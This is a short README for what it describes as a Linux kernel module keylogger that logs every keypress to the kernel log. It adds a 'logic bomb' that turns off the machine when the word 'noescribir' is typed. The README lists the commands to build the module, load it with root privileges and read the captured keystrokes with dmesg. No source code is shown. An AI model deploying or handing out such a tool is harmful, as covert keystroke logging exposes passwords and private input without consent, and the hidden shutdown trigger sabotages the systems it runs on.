# A simple keylogger
A Linux Kernel Module that logs every keypress. A logic bomb is included, it turns off the system when "noescribir" is typed.

### How to
```sh
$ make
```
```sh
$ sudo insmod keylogger.ko
```
### View log
```sh
$ dmesg
```
### Boom!
```sh
$ noescribir
```
